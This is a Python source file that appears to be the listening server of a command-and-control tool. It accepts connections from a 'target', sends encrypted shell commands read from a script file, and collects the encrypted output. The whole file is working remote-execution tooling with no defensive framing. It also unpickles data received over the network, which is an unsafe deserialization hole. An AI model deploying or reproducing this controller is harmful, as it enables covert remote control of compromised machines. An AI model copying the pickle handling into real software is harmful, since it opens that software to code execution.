# listen for incoming connections
import socket
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import json
import pickle

# '0.0.0.0' # listen to incoming connections from anywhere
# '192.168.x.x' # listen to only within same LAN
# 'localhost' # on same machine
# LISTEN_IP = '0.0.0.0'
# LISTEN_PORT = 5050
# read in config vars
with open("server_config.json") as config_f:
    config = json.load(config_f)

cwd = None
LISTEN_IP = config['LISTEN_IP']
LISTEN_PORT = config['LISTEN_PORT']

STATUS_SUCCESS = 1
STATUS_ERROR = 0

def read_key(key_fpath):
    with open(key_fpath, 'r') as key_f:
        hex_key = key_f.read()
        symm_key = bytes.fromhex(hex_key)
    return symm_key

def get_encrypted_msg(symmetric_key, msg, bytes=False):
    aesgcm = AESGCM(symmetric_key)
    nonce = os.urandom(12)
    if bytes:
        msg_bytes = msg
    else: # string
        msg_bytes = msg.encode()
    ct = aesgcm.encrypt(nonce=nonce, 
                        data=msg_bytes,
                        associated_data=None)
    return nonce + ct

# returns status: enum, decrypted_ct: string | bytes
def decrypt_ct(symmetric_key, msg_ct, bytes=False):
    status = STATUS_SUCCESS
    out_msg = "ERROR"
    try:
        # we are given nonce + ct
        nonce_length = 12
        nonce = msg_ct[:nonce_length]
        ct = msg_ct[nonce_length:]
        # decrypt
        aesgcm = AESGCM(symmetric_key)
        dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
                    data=ct,
                    associated_data=None)
        out_msg = dec_msg_bytes
        if not bytes: # output string
            out_msg = dec_msg_bytes.decode()
    except Exception as e:
        status = STATUS_ERROR
        out_msg = f"Error: Received bad message. Sender likely has incorrect key!"

    return status, out_msg


# def receive_msg(connection, buffer_size=1024):
#     print(f"received message from {connection.getsockname()}")
#     # receive message from server
#     # load in in chunks of buffer size
#     buffer_size = 1024
#     in_msg_list = []
#     while True:
#         msg_part = connection.recv(buffer_size)
#         print(msg_part)
#         if not msg_part:
#             break
#         else:
#             in_msg_list.append(msg_part)
#     full_msg = b"".join(in_msg_list)
#     return full_msg

def send_msg(connection, out_bytes):
    # first send message length
    msg_len = len(out_bytes)
    connection.send(msg_len.to_bytes(8, 'big'))
    # then send message
    connection.send(out_bytes)

def receive_msg(connection, buffer_size=1024):
    # first receive msg length
    len_data = connection.recv(8)
    if not len_data:
        return b"" # no length received
    
    in_msg_len = int.from_bytes(len_data, "big")

    # receive message
    bytes_received = 0
    in_msg_list = []
    while bytes_received < in_msg_len:
        bytes_to_receive = min(buffer_size, in_msg_len - bytes_received)
        msg_part = connection.recv(bytes_to_receive)
        if not msg_part:
            break # connection closed prematurely
        else:
            in_msg_list.append(msg_part)
            bytes_received += len(msg_part)
            
    full_msg = b"".join(in_msg_list)
    return full_msg

def run_server(ip, port):
    print(f"server running :{port} <- {ip}")
    host = ip  # socket.gethostname()
    # create socket
    # server_socket = socket.socket() # socket.AF_INET, socket.SOCK_STREAM
    with socket.socket() as server_socket: # graceful exception handling
        # bind socket to (host, port)
        server_socket.bind((host, port))
        # listen for incoming connection (only 1)
        server_socket.listen(5)

        while True:
            # accept connection
            conn, address = server_socket.accept()
            print(f"accepted conn from {address}")
                
            # read private key
            symm_key = read_key("symm_key.txt")

            # get the current working directory
            cwd_ct = receive_msg(
                connection=conn,
                buffer_size=1024
            )
            global cwd
            if cwd is None: # if it's my first time accepting connection
                status, cwd = decrypt_ct(
                    symmetric_key=symm_key,
                    msg_ct=cwd_ct
                )
            if status == STATUS_SUCCESS:
                # read code to run on target
                with open("run_on_target.sh", 'r') as file:
                    commands = file.read()
                # ask for code to run on target
                # commands = input(f"[{cwd}] $ ")
                message = pickle.dumps((cwd, commands))
                encrypted_msg = get_encrypted_msg(symmetric_key=symm_key,
                                                msg=message,
                                                bytes=True)
                # send msg to target
                send_msg(
                    connection=conn,
                    out_bytes=encrypted_msg,
                    )

                # receive output from running code on client side
                output_ct = receive_msg(
                    connection=conn,
                    buffer_size=1024
                )

                status, dec_ct = decrypt_ct(
                    symmetric_key=symm_key,
                    msg_ct=output_ct,
                    bytes=True
                )
                if status == STATUS_ERROR:
                    print("could not decrypt output")
                else:
                    cwd, script_output = pickle.loads(dec_ct)
                    print(f"received cwd: {cwd}")

                    # write out output
                    script_fname = "script_output.txt"
                    with open(script_fname, "w") as f:
                        f.write(script_output)
                    # print(script_output)
            else:
                # cwd is error message
                print(cwd)
                cwd = None

            # close connection
            conn.close()        

if __name__ == '__main__':
    run_server(LISTEN_IP, LISTEN_PORT)